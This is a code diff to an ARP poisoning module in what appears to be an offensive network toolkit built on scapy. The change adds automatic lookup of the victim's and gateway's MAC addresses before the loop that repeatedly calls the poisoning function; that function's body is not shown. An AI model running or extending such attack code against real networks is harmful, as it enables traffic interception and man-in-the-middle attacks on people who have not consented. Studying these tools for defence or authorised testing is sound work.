@@ -1,7 +1,6 @@
-# attacks/arp_poison.py
-
 from scapy.all import *
 import time
+from utils.network_utils import get_mac_address
 
 def poison_arp(victim_ip, victim_mac, gateway_ip, gateway_mac, attacker_mac, interface):
     """
@@ -69,6 +68,20 @@ def run(args):
     - Restores the ARP tables of the victim and the gateway when the attack is stopped.
     - Prints status messages indicating the start, stop, and success of the ARP poisoning.
     """
+    if not args.victim_mac:
+        print("No victim MAC address provided. Using get_mac_address utility to find it.")
+        args.victim_mac = get_mac_address(args.victim_ip, interface=args.interface)
+        if not args.victim_mac:
+            print("Failed to find MAC address for victim IP: {}".format(args.victim_ip))
+            return
+
+    if not args.gateway_mac:
+        print("No gateway MAC address provided. Using get_mac_address utility to find it.")
+        args.gateway_mac = get_mac_address(args.gateway_ip, interface=args.interface)
+        if not args.gateway_mac:
+            print("Failed to find MAC address for gateway IP: {}".format(args.gateway_ip))
+            return
+
     try:
         while True:
             poison_arp(args.victim_ip, args.victim_mac, args.gateway_ip, args.gateway_mac, args.attacker_mac, args.interface)
